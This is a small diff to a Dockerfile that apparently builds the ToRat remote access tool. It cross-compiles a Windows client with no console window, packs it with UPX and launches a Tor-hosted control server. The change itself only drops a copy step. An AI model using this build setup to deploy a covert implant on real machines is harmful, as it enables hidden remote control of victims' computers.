@@ -19,4 +19,4 @@ RUN /go/bin/xgo --targets=windows/amd64 --ldflags '-s -w -H windowsgui' -tags "t
 RUN mv /build/client-windows-4.0-amd64.exe /dist/client && upx /dist/client/client-windows-4.0-amd64.exe
 RUN mkdir /dist_ext
 
-CMD (tor -f /torrc&) && cp /go/src/github.com/cretz /cretz -rf && cp /dist /dist_ext -rf && cd /dist/server/ && ./ToRat_server
+CMD (tor -f /torrc&) && cp /dist /dist_ext -rf && cd /dist/server/ && ./ToRat_server
